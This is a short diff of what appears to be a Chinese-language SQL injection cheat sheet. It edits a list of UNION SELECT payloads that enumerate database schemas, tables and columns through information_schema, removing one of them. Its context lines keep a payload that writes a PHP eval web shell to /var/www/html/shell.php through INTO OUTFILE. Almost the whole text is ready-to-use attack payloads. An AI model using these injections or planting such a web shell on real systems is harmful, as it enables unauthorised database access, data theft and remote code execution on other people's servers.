@@ -45,8 +45,7 @@ union SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata;--+
 union SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database();--+
 获取指定表的所有列名：
 union SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='xxx';--+
-	x获取当前数据库的所有列名：
-	union SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=database();--+
+
 
 写入webshell：
 SELECT 1,2,'<?php @eval($_POST[shell])?>' into outfile '/var/www/html/shell.php'--+
